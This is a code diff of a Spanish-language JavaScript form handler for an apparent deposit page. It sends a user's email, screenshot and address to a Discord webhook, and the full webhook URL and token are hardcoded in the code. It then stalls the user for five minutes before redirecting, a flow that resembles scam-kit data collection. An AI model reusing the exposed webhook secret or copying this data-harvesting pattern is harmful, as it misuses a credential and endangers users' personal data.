@@ -85,38 +85,35 @@ function enviarDatos() {
     var correo = document.getElementById("correo").value;
     var direccion = document.getElementById("address").value;
 
-    // Validar el formato del correo y la existencia de la captura y la dirección
     if (correo && correo.trim() !== '' && captura && direccion && direccion.trim() !== '') {
-        // Mostrar mensaje de procesamiento
         var mensajeProcesando = document.getElementById("mensaje-procesando");
         mensajeProcesando.textContent = "Procesando el depósito. Por favor, espere unos minutos para que se complete la operación.";
-        mensajeProcesando.style.color = "#00ff00"; // Color verde para indicar un mensaje informativo
+        mensajeProcesando.style.color = "#00ff00";
 
-        // Crear un objeto FormData para enviar los datos del formulario al servidor
-        var formData = new FormData();
-        formData.append('correo', correo);
-        formData.append('captura', captura);
-        formData.append('direccion', direccion);
+        var data = {
+            correo: correo,
+            captura: captura,
+            direccion: direccion
+        };
 
-        // Realizar una solicitud POST al Webhook de Discord
         fetch('https://discordapp.com/api/webhooks/1099001430674784376/NDajDoUsRC042nVrw8PkhOw589lybj_lx7Fv8qdfZ5e6e9Pd9s59QtBULxdoDCOn7rtc', {
             method: 'POST',
-            body: formData
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
         })
         .then(response => {
             if (response.ok) {
-                // Éxito
                 mostrarMensaje("Depósito procesado con éxito. Recibirás un correo electrónico pronto.");
                 setTimeout(function() {
-                    window.location.href = "/pagina-principal"; // Redirigir al usuario a la página principal después de un cierto tiempo
-                }, 300000); // Redirigir después de 5 minutos (300000 milisegundos)
+                    window.location.href = "/pagina-principal";
+                }, 300000);
             } else {
-                // Error
                 mostrarError("Error al procesar el depósito. Por favor, inténtalo de nuevo más tarde.");
             }
         })
         .catch(error => {
-            // Error de red u otros errores
             console.error('Error:', error);
             mostrarError("Error al procesar el depósito. Por favor, inténtalo de nuevo más tarde.");
         });
@@ -124,6 +121,7 @@ function enviarDatos() {
         mostrarError("Por favor, ingrese un correo válido, una imagen y una dirección.");
     }
 }
+
 
     function mostrarMensaje(mensaje) {
         var mensajeFlotante = document.getElementById("mensaje-copiado");
